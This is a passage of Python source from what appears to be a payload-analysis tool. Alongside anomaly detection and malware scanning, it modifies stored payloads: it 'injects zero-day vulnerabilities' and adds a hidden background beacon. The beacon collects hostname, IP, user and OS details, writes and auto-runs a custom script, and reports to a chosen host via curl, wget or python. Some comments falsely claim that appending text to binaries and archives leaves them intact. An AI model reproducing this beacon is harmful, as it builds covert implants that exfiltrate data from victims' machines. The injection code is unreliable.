    elif payload_type == "xml":
        # For XML, we try to inject into a text node or attribute
        try:
            import re
            # Look for text content in XML tags and inject there
            text_pattern = r">([^<]+)</"
            match = re.search(text_pattern, payload_content)
            if match:
                text_content = match.group(1)
                new_content = text_content + " " + zero_day_pattern
                return payload_content.replace(text_content, new_content)
            else:
                # If no text content, inject into an attribute
                attr_pattern = r'(\w+)="([^"]+)"'
                match = re.search(attr_pattern, payload_content)
                if match:
                    attr_value = match.group(2)
                    new_value = attr_value + " " + zero_day_pattern
                    return payload_content.replace(attr_value, new_value)
                else:
                    # If no suitable place, inject as a comment
                    return payload_content + "\n<!-- Zero-day injection: " + zero_day_pattern + " -->"
        except:
            # Fallback to appending as a comment
            return payload_content + "\n<!-- Zero-day injection: " + zero_day_pattern + " -->"
    
    elif payload_type == "script":
        # For scripts, append the code at an appropriate location
        try:
            lines = payload_content.split("\n")
            # Find a good place to inject, preferably after #!/bin/bash or similar
            for i, line in enumerate(lines):
                if line.startswith("#!") or line.startswith("import ") or "function " in line:
                    lines.insert(i+1, "# Zero-day injection: " + zero_day_pattern)
                    return "\n".join(lines)
            
            # If no suitable place found, just append
            return payload_content + "\n\n# Zero-day injection:\n" + zero_day_pattern
        except:
            # Simple append
            return payload_content + "\n\n# Zero-day injection: " + zero_day_pattern
    
    elif payload_type in ["exe", "dll", "msi", "jar", "apk", "ipa"]:
        # Executable files - add a comment or string depending on the file format
        if payload_type in ["jar", "apk", "ipa"]:
            # These are archive formats that may contain Java/Kotlin/Swift code
            return payload_content + "\n\n// Zero-day injection for " + payload_type + ": " + zero_day_pattern
        else:
            # Binary executables - append to end without corrupting the file
            return payload_content + "\n\n<!-- Zero-day injection for " + payload_type + ": " + zero_day_pattern + " -->"
            
    elif payload_type in ["js", "vbs", "ps1", "bat", "sh"]:
        # Script files - use appropriate comment syntax
        if payload_type == "js":
            return payload_content + "\n\n// Zero-day injection: " + zero_day_pattern
        elif payload_type == "vbs":
            return payload_content + "\n\n' Zero-day injection: " + zero_day_pattern
        elif payload_type == "ps1":
            return payload_content + "\n\n# Zero-day injection: " + zero_day_pattern
        elif payload_type in ["bat", "sh"]:
            return payload_content + "\n\n:: Zero-day injection: " + zero_day_pattern
            
    elif payload_type in ["doc", "docx", "xls", "xlsx", "ppt", "pptx"]:
        # Document files - these might need special handling, but for now append metadata
        return payload_content + "\n\n<!-- Zero-day injection for document: " + zero_day_pattern + " -->"
        
    elif payload_type in ["png", "jpg", "jpeg", "gif", "bmp"]:
        # Image files - append after EOF without corrupting the image
        return payload_content + "\n\n<!-- Zero-day injection for image: " + zero_day_pattern + " -->"
        
    elif payload_type in ["mp3", "wav", "aac"]:
        # Audio files - append after EOF without corrupting the audio
        return payload_content + "\n\n<!-- Zero-day injection for audio: " + zero_day_pattern + " -->"
        
    elif payload_type in ["mp4", "avi", "mkv"]:
        # Video files - append after EOF without corrupting the video
        return payload_content + "\n\n<!-- Zero-day injection for video: " + zero_day_pattern + " -->"
        
    elif payload_type in ["zip", "rar", "7z", "tar", "gz"]:
        # Compressed files - append comment without corrupting the archive
        return payload_content + "\n\n<!-- Zero-day injection for archive: " + zero_day_pattern + " -->"
        
    elif payload_type in ["ttf", "otf"]:
        # Font files - append after EOF without corrupting the font
        return payload_content + "\n\n<!-- Zero-day injection for font: " + zero_day_pattern + " -->"
        
    elif payload_type in ["db", "sqlite"]:
        # Database files - append comment without corrupting the database
        return payload_content + "\n\n-- Zero-day injection for database: " + zero_day_pattern
        
    elif payload_type in ["xml", "json", "yml", "ini"]:
        # Configuration files - use appropriate syntax
        if payload_type == "xml":
            return payload_content + "\n\n<!-- Zero-day injection: " + zero_day_pattern + " -->"
        elif payload_type == "json":
            return payload_content + "\n\n// Zero-day injection: " + zero_day_pattern
        elif payload_type == "yml":
            return payload_content + "\n\n# Zero-day injection: " + zero_day_pattern
        elif payload_type == "ini":
            return payload_content + "\n\n; Zero-day injection: " + zero_day_pattern
            
    else:  # text and any other type
        # For plain text or any unrecognized type, just append the injection
        return payload_content + "\n\n-- Zero-day injection: " + zero_day_pattern

def analyze_payload(payload_id, inject_zero_day=True, selected_vulnerability=None, specific_example=None, 
                use_deep_learning=False, deep_learning_model='ensemble', use_virustotal=True, use_metasploit=False,
                listener_config=None, custom_script=None):
    """
    Analyze a payload for potential vulnerabilities.
    
    This function orchestrates the complete analysis process:
    1. Extract features from the payload
    2. Detect anomalies using trained models (traditional ML or deep learning)
    3. Assign to a cluster
    4. Check for known vulnerability patterns
    5. Update the database with results
    6. Optionally inject zero-day vulnerability (new feature)
    7. Optionally add callback listener functionality to payload
    8. Optionally integrate custom script with listener functionality
    
    Args:
        payload_id (int): ID of the payload to analyze
        inject_zero_day (bool): Whether to inject a zero-day vulnerability
        selected_vulnerability (str, optional): Specific vulnerability type to inject
        specific_example (str, optional): Specific vulnerability example to inject
        use_deep_learning (bool): Whether to use deep learning models for detection
        deep_learning_model (str): Type of deep learning model to use ('lstm', 'cnn', 'transformer', 'ensemble')
        use_virustotal (bool): Whether to use VirusTotal API for additional malware scanning
        use_metasploit (bool): Whether to use Metasploit patterns for enhanced vulnerability detection
        listener_config (dict, optional): Configuration for callback listener functionality:
            {
                'host': Listener host/IP address
                'port': Listener port number
                'interval': Callback interval in seconds
                'report_data': Dict specifying data to report (hostname, ip, user, os)
            }
        custom_script (dict, optional): Configuration for custom script integration:
            {
                'code': Custom script code to include
                'language': Script language (bash, python, javascript, powershell)
                'auto_execute': Whether to auto-execute the script
            }
        
    Returns:
        dict: Analysis results
    """
    logger.info(f"Analyzing payload: {payload_id}")
    
    # Update the news feed on every analysis
    update_news_feed()
    
    # Get the payload from the database
    payload = Payload.query.get(payload_id)
    if not payload:
        raise ValueError(f"Payload with ID {payload_id} not found")
    
    try:
        # Step 1: Extract features with advanced exploitation pattern detection
        features = extract_features_from_payload(payload_id)
        
        # Step 2: Perform anomaly detection, with options for deep learning models
        if use_deep_learning:
            try:
                from ml_engine.deep_learning import detect_anomalies_deep
                # Log the model choice
                logger.info(f"Using deep learning model type: {deep_learning_model}")
                
                # Use deep learning models for best detection
                anomaly_result = detect_anomalies_deep([payload_id], model_type=deep_learning_model)
                
                if not anomaly_result:
                    # Fall back to ensemble methods
                    logger.info("Deep learning detection returned no results, trying ensemble methods")
                    from ml_engine.ensemble import ensemble_anomaly_detection
                    # Use multiple advanced models for better detection
                    anomaly_result = ensemble_anomaly_detection(
                        payload_ids=[payload_id],
                        models=["isolation_forest", "elliptic_envelope", "one_class_svm"]
                    )
                
                if not anomaly_result:
                    # Fall back to standard detection if all advanced methods fail
                    logger.warning("All advanced detection methods failed, falling back to standard detection")
                    anomaly_result = detect_anomalies([payload_id])
            except Exception as e:
                logger.warning(f"Deep learning detection failed, falling back to standard: {str(e)}")
                # Fall back to standard anomaly detection
                anomaly_result = detect_anomalies([payload_id])
        else:
            try:
                # Use ensemble methods for better detection accuracy
                from ml_engine.ensemble import ensemble_anomaly_detection
                anomaly_result = ensemble_anomaly_detection(
                    payload_ids=[payload_id],
                    models=["isolation_forest", "elliptic_envelope", "one_class_svm"]
                )
                
                if not anomaly_result:
                    # Fall back to standard detection if ensemble methods fail
                    logger.warning("Ensemble detection methods failed, falling back to standard detection")
                    anomaly_result = detect_anomalies([payload_id])
            except Exception as e:
                logger.warning(f"Advanced anomaly detection failed, falling back to standard: {str(e)}")
                # Fall back to standard anomaly detection
                anomaly_result = detect_anomalies([payload_id])
        
        # Step 3: Perform advanced clustering with consensus approach
        # Try consensus clustering first, fall back to standard if needed
        try:
            from ml_engine.ensemble import consensus_clustering
            # Use multiple clustering models for better results
            cluster_result = consensus_clustering(
                payload_ids=[payload_id]
            )
            if not cluster_result:
                # Fall back to standard clustering if consensus fails
                cluster_result = cluster_payloads([payload_id])
        except Exception as e:
            logger.warning(f"Consensus clustering failed, falling back to standard: {str(e)}")
            # Fall back to standard clustering
            cluster_result = cluster_payloads([payload_id])
        
        # Step 4: Combined detection approach for enhanced accuracy
        try:
            from ml_engine.ensemble import combine_detection_methods
            combined_result = combine_detection_methods([payload_id])
            # If combined detection succeeds, update the anomaly and cluster results
            if combined_result and payload_id in combined_result:
                combined_data = combined_result[payload_id]
                
                # Create or update anomaly result with combined data
                if anomaly_result is None:
                    anomaly_result = {}
                if payload_id not in anomaly_result:
                    anomaly_result[payload_id] = {}
                    
                # Update with enhanced detection
                anomaly_result[payload_id]["anomaly_score"] = combined_data.get("anomaly_score", 0)
                anomaly_result[payload_id]["is_anomalous"] = combined_data.get("is_anomalous", False)
                anomaly_result[payload_id]["confidence"] = combined_data.get("confidence", 0.7)
                
                # Update cluster if available
                if "cluster_id" in combined_data:
                    if cluster_result is None:
                        cluster_result = {}
                    if payload_id not in cluster_result:
                        cluster_result[payload_id] = {}
                    cluster_result[payload_id]["cluster_id"] = combined_data.get("cluster_id")
        except Exception as e:
            logger.warning(f"Combined detection failed, using individual results: {str(e)}")
        
        # Step 5: Enhanced vulnerability pattern matching using ML features
        vulnerabilities = check_vulnerabilities(payload, use_virustotal=use_virustotal, use_metasploit=use_metasploit)
        
        # Step 5b: Examine advanced exploitation indicators
        if 'exploitation_score' in features:
            # If we detect a high exploitation score from our advanced pattern matching
            if features['exploitation_score'] > 3.0:  # Threshold determined by testing
                # Create a vulnerability record based on the highest pattern matches
                patterns = []
                if features.get('reverse_shell_indicator_count', 0) > 1:
                    patterns.append("Reverse Shell")
                if features.get('data_exfiltration_indicator_count', 0) > 1:
                    patterns.append("Data Exfiltration")
                if features.get('persistence_indicator_count', 0) > 1:
                    patterns.append("Persistence Mechanism")
                if features.get('obfuscation_indicator_count', 0) > 1:
                    patterns.append("Code Obfuscation")
                
                if patterns:
                    vuln_name = f"Potential {'&'.join(patterns)} Attempt"
                    vuln_desc = f"Advanced pattern matching detected {', '.join(patterns).lower()} indicators in the payload."
                    
                    # Create vulnerability record
                    exploitation_vuln = Vulnerability(
                        name=vuln_name,
                        description=vuln_desc,
                        severity="high" if features['exploitation_score'] > 5.0 else "medium",
                        confidence=min(0.95, features['exploitation_score'] / 10.0),
                        payload_id=payload.id
                    )
                    
                    db.session.add(exploitation_vuln)
                    vulnerabilities.append(exploitation_vuln)
        
        # Step 5: Inject zero-day vulnerability if requested
        if inject_zero_day:
            original_content = payload.content
            vulnerability_to_inject = selected_vulnerability or "SQL Injection"  # Default
            
            # If no specific vulnerability selected and we have detected vulnerabilities, 
            # use the detected type for more realistic injection
            if not selected_vulnerability and vulnerabilities:
                vulnerability_to_inject = vulnerabilities[0].name
            
            # Inject zero-day
            modified_content = inject_zero_day_vulnerability(
                original_content, 
                payload.content_type, 
                vulnerability_to_inject,
                specific_example
            )
            
            # Get the category for a better description
            from models import ZeroDayCategory
            category = ZeroDayCategory.query.filter_by(name=vulnerability_to_inject).first()
            description = f"Injected zero-day vulnerability of type {vulnerability_to_inject}"
            if category:
                description = category.description
            
            # Create a "Zero-Day" vulnerability record
            zero_day_vuln = Vulnerability(
                name="Zero-Day " + vulnerability_to_inject,
                description=description,
                severity="critical",
                confidence=0.99,
                payload_id=payload.id
            )
            
            db.session.add(zero_day_vuln)
            vulnerabilities.append(zero_day_vuln)
            
            # Update payload with modified content
            payload.content = modified_content
            payload.size = len(modified_content)
        
        # Step 6: Add listener functionality and custom script if configured
        listener_added = False
        custom_script_added = False
        
        if listener_config and listener_config.get('host'):
            logger.info(f"Adding listener functionality to payload {payload_id}")
            try:
                # Get the current content (which may have been modified by zero-day injection)
                original_content = payload.content
                
                # Process custom script if provided
                if custom_script and custom_script.get('code', '').strip():
                    # Add custom script to listener config
                    if not 'custom_script' in listener_config:
                        listener_config['custom_script'] = {}
                    
                    listener_config['custom_script'] = {
                        'code': custom_script.get('code', '').strip(),
                        'language': custom_script.get('language', 'bash'),
                        'auto_execute': custom_script.get('auto_execute', True)
                    }
                    custom_script_added = True
                    logger.info(f"Custom script ({listener_config['custom_script']['language']}) integration configured")
                
                # Add listener functionality with optional custom script
                modified_content = add_listener_functionality(
                    original_content,
                    payload.content_type,
                    listener_config
                )
                
                # Update payload with modified content
                payload.content = modified_content
                payload.size = len(modified_content)
                listener_added = True
                
                # Create a "Listener" vulnerability record to track that it was added
                listener_description = f"Added callback listener functionality targeting {listener_config.get('host')}:{listener_config.get('port')}"
                
                # Add information about custom script if added
                if custom_script_added:
                    # Check if the script is from the library
                    if listener_config['custom_script'].get('from_library', False):
                        listener_description += f" with custom {listener_config['custom_script']['language']} script from library"
                        # Add script library name if available
                        if 'library_script_name' in listener_config['custom_script']:
                            listener_description += f", library script name: {listener_config['custom_script']['library_script_name']}"
                        # Add script library ID if available
                        if 'library_script_id' in listener_config['custom_script']:
                            listener_description += f", library script id: {listener_config['custom_script']['library_script_id']}"
                    else:
                        listener_description += f" with custom {listener_config['custom_script']['language']} script"
                    
                    # Add auto-execution information
                    if listener_config['custom_script']['auto_execute']:
                        listener_description += " (auto-executing)"
                    else:
                        listener_description += " (manual execution required)"
                
                listener_vuln = Vulnerability(
                    name="Callback Listener" + (" with Custom Script" if custom_script_added else ""),
                    description=listener_description,
                    severity="medium",
                    confidence=0.99,
                    payload_id=payload.id
                )
                
                db.session.add(listener_vuln)
                vulnerabilities.append(listener_vuln)
                
                logger.info(f"Listener functionality added to payload {payload_id}" + 
                           (f" with custom {listener_config['custom_script']['language']} script" if custom_script_added else ""))
            except Exception as e:
                logger.error(f"Error adding listener functionality: {str(e)}")
        
        # Step 7: Mark the payload as analyzed
        payload.analyzed = True
        db.session.commit()
        
        # Prepare the result
        result = {
            "payload_id": payload_id,
            "anomaly_result": anomaly_result.get(payload_id, {}),
            "cluster_result": cluster_result.get(payload_id, {}),
            "vulnerabilities": [
                {
                    "id": v.id,
                    "name": v.name,
                    "description": v.description,
                    "severity": v.severity,
                    "confidence": v.confidence
                } for v in vulnerabilities
            ],
            "zero_day_injected": inject_zero_day,
            "listener_added": listener_added,
            "custom_script_added": custom_script_added,
            "virustotal_scan_enabled": use_virustotal,
            "external_services_used": {
                "virustotal": use_virustotal,
                "networksentry": os.environ.get('NETWORKSENTRY_API_KEY') is not None,
                "alienvault": os.environ.get('ALIENVAULT_OTX_API_KEY') is not None,
                "metasploit": use_metasploit
            }
        }
        
        # Add details about the custom script if added
        if custom_script_added and listener_config and 'custom_script' in listener_config:
            result["custom_script_details"] = {
                "language": listener_config['custom_script'].get('language', 'bash'),
                "auto_execute": listener_config['custom_script'].get('auto_execute', True)
            }
        
        logger.info(f"Payload analysis completed: {payload_id}")
        
        return result
    
    except Exception as e:
        logger.error(f"Error analyzing payload {payload_id}: {str(e)}")
        raise

def add_listener_functionality(payload_content, content_type, listener_config):
    """
    Add callback listener functionality to a payload.
    
    This function adds code to the payload that will cause it to send information back
    to a specified listener when executed on a target system.
    
    Args:
        payload_content (str): Original payload content
        content_type (str): Type of payload (json, xml, text, script)
        listener_config (dict): Listener configuration:
            {
                'host': Listener host/IP address
                'port': Listener port number
                'interval': Callback interval in seconds
                'report_data': Dict specifying data to report (hostname, ip, user, os)
                'custom_script': Dict with custom script configuration:
                    {
                        'code': Custom script code to include
                        'language': Script language (bash, python, javascript, powershell)
                        'auto_execute': Whether to auto-execute the script
                    }
            }
            
    Returns:
        str: Modified payload content with injected listener functionality
    """
    host = listener_config.get('host')
    port = listener_config.get('port', 443)
    interval = listener_config.get('interval', 60)
    report_data = listener_config.get('report_data', {})
    custom_script = listener_config.get('custom_script', {})
    
    # If host isn't specified, we can't add listener functionality
    if not host:
        logger.warning("No host specified in listener_config, skipping listener functionality")
        return payload_content
    
    # Determine what data to report
    collect_hostname = report_data.get('hostname', True)
    collect_ip = report_data.get('ip', True)
    collect_user = report_data.get('user', True)
    collect_os = report_data.get('os', True)
    
    # Process custom script if available
    has_custom_script = bool(custom_script and custom_script.get('code', '').strip())
    custom_script_code = custom_script.get('code', '').strip() if has_custom_script else ''
    script_language = custom_script.get('language', 'bash') if has_custom_script else 'bash'
    auto_execute = custom_script.get('auto_execute', True) if has_custom_script else True
    
    # Generate callback code based on content_type
    if content_type == 'script':
        # Build the script using regular string concatenation
        script_lines = []
        script_lines.append("# Callback functionality - reports system information to listener")
        script_lines.append("(")
        script_lines.append("    while true; do")
        script_lines.append("        # Collect system information")
        script_lines.append("        data=\"\"")
        
        # Conditionally add data collection based on report_data settings
        if collect_hostname:
            script_lines.append("        hostname=$(hostname); data=\"$data&hostname=$hostname\"")
            # Export as environment variable for custom script
            script_lines.append("        export HOSTNAME=\"$hostname\"")
        
        if collect_ip:
            script_lines.append("        ipaddr=$(hostname -I 2>/dev/null || ifconfig | grep -Eo \"inet (addr:)?([0-9]*\\.){3}[0-9]*\" | grep -Eo \"([0-9]*\\.){3}[0-9]*\" | head -1); data=\"$data&ip=$ipaddr\"")
            # Export as environment variable for custom script
            script_lines.append("        export IP=\"$ipaddr\"")
        
        if collect_user:
            script_lines.append("        username=$(whoami); data=\"$data&user=$username\"")
            # Export as environment variable for custom script
            script_lines.append("        export USERNAME=\"$username\"")
        
        if collect_os:
            script_lines.append("        osinfo=$(uname -a); data=\"$data&os=$osinfo\"")
            # Export as environment variable for custom script
            script_lines.append("        export OSINFO=\"$osinfo\"")
        
        # Add custom script if provided
        if has_custom_script:
            script_lines.append("")
            script_lines.append("        # Custom script integration")
            
            # Create temporary file with the custom script
            temp_script_name = f"'/tmp/custom_script_{script_language}_{int(time.time())}.{script_language}'"
            
            # Determine proper file extension
            script_ext = {
                'bash': 'sh',
                'python': 'py',
                'javascript': 'js',
                'powershell': 'ps1'
            }.get(script_language, 'sh')
            
            # Write script to temporary file with multiline content
            script_lines.append(f"        cat > /tmp/custom_script_{script_language}.{script_ext} << 'EOFSCRIPT'")
            script_lines.append(custom_script_code)
            script_lines.append("EOFSCRIPT")
            
            # Make script executable
            script_lines.append(f"        chmod +x /tmp/custom_script_{script_language}.{script_ext}")
            
            # Execute based on language if auto-execute is enabled
            if auto_execute:
                if script_language == 'bash':
                    script_lines.append(f"        bash /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1")
                elif script_language == 'python':
                    script_lines.append(f"        python3 /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1 || python /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1")
                elif script_language == 'javascript':
                    script_lines.append(f"        node /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1 || nodejs /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1")
                elif script_language == 'powershell':
                    script_lines.append(f"        pwsh /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1 || powershell /tmp/custom_script_{script_language}.{script_ext} >> /tmp/custom_script.log 2>&1")
        
        # Add data reporting section
        script_lines.append("")
        script_lines.append("        # Send data to listener using various methods")
        script_lines.append(f"        curl -s -k \"https://{host}:{port}/callback?id=$(hostname)$data\" >/dev/null 2>&1 ||")
        script_lines.append(f"        wget -q -O /dev/null \"https://{host}:{port}/callback?id=$(hostname)$data\" 2>/dev/null ||")
        script_lines.append(f"        python -c \"import urllib.request; urllib.request.urlopen('https://{host}:{port}/callback?id='+__import__('socket').gethostname()+'$data')\" 2>/dev/null ||")
        script_lines.append(f"        python3 -c \"import urllib.request; urllib.request.urlopen('https://{host}:{port}/callback?id='+__import__('socket').gethostname()+'$data')\" 2>/dev/null")
        
        script_lines.append("")
        script_lines.append(f"        # Wait for interval")
        script_lines.append(f"        sleep {interval}")
        script_lines.append("    done")
        script_lines.append(") >/dev/null 2>&1 &")
        script_lines.append("# End of callback functionality")
        
        # Join the script lines with newlines
        callback_code = "\n".join(script_lines)
        # Append to the end of the script
        return payload_content + "\n\n" + callback_code
        
    elif content_type == 'json':
        try:
            # Parse the JSON
            import json
            data = json.loads(payload_content)
            
            # Add a comment about the listener (as a special field that shouldn't affect functionality)
            callback_info = {
                'host': host,
                'port': port,
                'interval': interval,
                'report': list(k for k, v in report_data.items() if v)
            }
            
            # Add custom script information if available
            if has_custom_script:
                callback_info['custom_script'] = {
                    'language': script_language,
                    'auto_execute': auto_execute
                }
                
            data['__callback_listener'] = callback_info
            
            # Return the modified JSON
            return json.dumps(data, indent=2)
        except:
            # If JSON parsing fails, just append a comment
            return payload_content + f'\n\n// Callback listener: {host}:{port} (interval: {interval}s)'
            
    elif content_type == 'xml':
        # For XML, add a comment with listener information
        callback_comment = f"""
<!-- 
    Callback Listener Configuration:
    Host: {host}
    Port: {port}
    Interval: {interval}
    Report Data: {', '.join(k for k, v in report_data.items() if v)}
"""

        # Add custom script information if available
        if has_custom_script:
            callback_comment += f"""
    Custom Script:
    Language: {script_language}
    Auto-Execute: {'Yes' if auto_execute else 'No'}
"""
        
        callback_comment += "-->\n"
        
        # Try to insert before the closing of the root element if we can find it
        import re
        root_end_match = re.search(r'</[^>]+>$', payload_content)
        if root_end_match:
            insert_pos = root_end_match.start()
            return payload_content[:insert_pos] + callback_comment + payload_content[insert_pos:]
        else:
            # Otherwise append to the end
            return payload_content + "\n\n" + callback_comment
            
    else:  # text and any other type
        # For plain text, add a comment with listener information
        callback_comment = f"""
# Callback Listener Configuration:
# Host: {host}
# Port: {port}
# Interval: {interval}
# Report Data: {', '.join(k for k, v in report_data.items() if v)}
"""

        # Add custom script information if available
        if has_custom_script:
            callback_comment += f"""
# Custom Script:
# Language: {script_language}
# Auto-Execute: {'Yes' if auto_execute else 'No'}
"""
        
        return payload_content + "\n\n" + callback_comment


def check_vulnerabilities(payload, use_virustotal=True, use_metasploit=False):
    """
    Check a payload for common vulnerability patterns.
    
    Args:
        payload (Payload): Payload object to check
        use_virustotal (bool): Whether to use VirusTotal API for additional scanning
        use_metasploit (bool): Whether to use Metasploit patterns for enhanced detection
        
    Returns:
        list: List of detected Vulnerability objects
    """
    vulnerabilities = []
    content = payload.content
    
    # Try to check for reverse shell patterns using NetworkSentry API
    try:
        import os
        has_networksentry_key = os.environ.get('NETWORKSENTRY_API_KEY') is not None
        
        if has_networksentry_key:
            from ml_engine.api_integrations import analyze_reverse_shell_patterns
            
            # Analyze payload for reverse shell patterns
            result = analyze_reverse_shell_patterns(content, payload.content_type)
            
            # If a reverse shell is detected, add it as a vulnerability
            if result.get('reverse_shell_detected', False):
                confidence = result.get('confidence', 0.7)
                patterns = result.get('patterns', [])
                
                # Create description from analysis
                description = f"Reverse shell detected with {confidence:.2f} confidence. "
                if patterns:
                    description += f"Detected patterns: {', '.join(patterns[:3])}"
                else:
                    description += result.get('analysis', 'Suspicious reverse shell code detected')
                
                # Create the vulnerability
                vulnerability = Vulnerability(
                    name="Reverse Shell",
                    description=description,
                    severity="critical",
                    confidence=confidence,
                    payload_id=payload.id
                )
                
                vulnerabilities.append(vulnerability)
                logger.warning(f"Reverse shell detected in payload {payload.id} with confidence {confidence:.2f}")
    
    except Exception as e:
        logger.error(f"Error checking for reverse shell patterns: {str(e)}")
        
    # Use Metasploit patterns for enhanced detection if enabled
    if use_metasploit:
        try:
            from ml_engine.metasploit_integration import analyze_with_metasploit
            
            logger.info(f"Analyzing payload {payload.id} with Metasploit patterns")
            metasploit_results = analyze_with_metasploit(payload.content, payload.content_type)
            
            for vuln in metasploit_results.get('vulnerabilities', []):
                vulnerability = Vulnerability(
                    name=f"Metasploit {vuln['name']}",
                    description=vuln['description'],
                    severity=vuln['severity'],
                    confidence=vuln.get('confidence', 0.8),
                    payload_id=payload.id
                )
                
                vulnerabilities.append(vulnerability)
                db.session.add(vulnerability)
                
                logger.warning(f"Metasploit pattern detected in payload {payload.id}: {vuln['name']}")
        
        except Exception as e:
            logger.error(f"Error analyzing with Metasploit patterns: {str(e)}")
    
    # Use VirusTotal API for malware detection if enabled
    if use_virustotal:
        try:
            import os
            has_virustotal_key = os.environ.get('VIRUSTOTAL_API_KEY') is not None
            
            if has_virustotal_key:
                from ml_engine.api_integrations import scan_file_with_virustotal
                
                # Generate a filename based on content type
                file_extension = {
                    'json': '.json',
                    'xml': '.xml',
                    'script': '.py',  # Default to Python, but could be any script
                    'binary': '.bin'
                }.get(payload.content_type, '.txt')
                
                file_name = f"payload_{payload.id}{file_extension}"
                
                # Scan the file with VirusTotal
                logger.info(f"Scanning payload {payload.id} with VirusTotal")
                scan_result = scan_file_with_virustotal(payload.content, file_name)
                
                # If malware detected or analysis succeeded, process the results
                if scan_result.get('success', False):
                    # If malware was detected
                    if scan_result.get('detected', False):
                        threat_level = scan_result.get('threat_level', 'medium')
                        detection_rate = scan_result.get('detection_rate', 0)
                        threat_categories = scan_result.get('threat_categories', [])
                        
                        # Map VirusTotal severity to our severity levels
                        severity_mapping = {
                            'critical': 'critical',
                            'high': 'high',
                            'medium': 'medium',
                            'low': 'low',
                            'safe': 'info'
                        }
                        
                        severity = severity_mapping.get(threat_level, 'medium')
                        
                        # Create description from analysis
                        description = f"VirusTotal detected malware with {detection_rate:.2%} of engines flagging this payload. "
                        if threat_categories:
                            description += f"Detected threats: {', '.join(threat_categories[:5])}"
                            if len(threat_categories) > 5:
                                description += f" and {len(threat_categories) - 5} more"
                        
                        # Add permalink if available
                        if 'permalink' in scan_result:
                            description += f"\nVirusTotal report: {scan_result['permalink']}"
                        
                        # Create the vulnerability
                        vulnerability = Vulnerability(
                            name="Malware Detected",
                            description=description,
                            severity=severity,
                            confidence=min(0.99, detection_rate + 0.2),  # Confidence based on detection rate
                            payload_id=payload.id
                        )
                        
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"Malware detected in payload {payload.id} with {detection_rate:.2%} detection rate")
                
                # Note: Even if not detected as malicious, we don't add a "safe" vulnerability
                
            else:
                logger.info("VirusTotal API key not available, skipping malware scan")
                
        except Exception as e:
            logger.error(f"Error scanning with VirusTotal: {str(e)}")
    
    # Check all vulnerability patterns
    for check in VULNERABILITY_CHECKS:
        confidence = 0.0
        matches = []
        
        # Check each pattern
        for pattern in check["patterns"]:
            pattern_matches = re.findall(pattern, content, re.IGNORECASE)
            if pattern_matches:
                matches.extend(pattern_matches)
                # Increase confidence with each match
                confidence += 0.1 * len(pattern_matches)
        
        # Cap confidence at 0.95
        confidence = min(0.95, confidence)
        
        # If we found matches, create a vulnerability
        if matches and confidence > 0.1:
            # Create a description of the vulnerability
            description = f"Detected potential {check['name']} with {len(matches)} suspicious patterns: "
            description += ", ".join(str(m) for m in matches[:5])
            if len(matches) > 5:
                description += f", and {len(matches) - 5} more"
            
            # Create the vulnerability
            vulnerability = Vulnerability(
                name=check["name"],
                description=description,
                severity=check["severity"],
                confidence=confidence,
                payload_id=payload.id
            )
            
            # Add to database
            db.session.add(vulnerability)
            vulnerabilities.append(vulnerability)
    
    # Commit changes
    db.session.commit()
    
    return vulnerabilities

def get_vulnerability_statistics():
    """
    Get statistics about detected vulnerabilities.
    
    Returns:
        dict: Vulnerability statistics
    """
    try:
        # Count vulnerabilities by type
        vulnerabilities = Vulnerability.query.all()
        
        if not vulnerabilities:
            return {"count": 0, "types": {}}
        
        # Group vulnerabilities by type
        type_counts = {}
        severity_counts = {"low": 0, "medium": 0, "high": 0, "critical": 0}
        
        for vuln in vulnerabilities:
            if vuln.name not in type_counts:
                type_counts[vuln.name] = 0
            type_counts[vuln.name] += 1
            
            if vuln.severity in severity_counts:
                severity_counts[vuln.severity] += 1
        
        # Sort by count
        sorted_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)
        
        return {
            "count": len(vulnerabilities),
            "types": dict(sorted_types),
            "severity": severity_counts
        }
    
    except Exception as e:
        logger.error(f"Error getting vulnerability statistics: {str(e)}")
        return {"error": str(e)}
